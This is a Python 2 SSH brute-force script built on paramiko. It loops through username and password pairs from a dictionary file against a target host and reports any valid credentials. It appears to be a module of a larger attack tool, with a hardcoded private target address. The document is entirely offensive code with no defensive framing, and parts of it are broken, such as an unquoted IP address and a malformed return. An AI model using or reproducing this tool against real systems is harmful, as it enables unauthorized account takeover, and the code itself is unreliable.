#!/usr/bin/env python

import paramiko
import sys

def sshCrack(ipAddress, dictionaryFile) :

	print "[+] Attacking Host : %s " %ipAddress

	ssh = paramiko.SSHClient()

	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	for line in open(dictionaryFile, "r").readlines() :

		[username, password] = line.strip().split()

		try :
			print "[+] Trying to break in with username: %s password: %s " % (username, password)
			ssh.connect(ipAddress, username=username, password=password)

		except paramiko.AuthenticationException:
			print "[-] Failed! ..."
			continue

		print "[+] Success ... username: %s and password %s is VALID! " % (username, password)
		return str(username,password)

def run(**args):
    print "[*] In ssh module."
    files = sshCrack(192.168.1.100,"../config/dictionary")

    return str(files)



if __name__ == "__main__" :
	sshCrack(sys.argv[1], sys.argv[2])
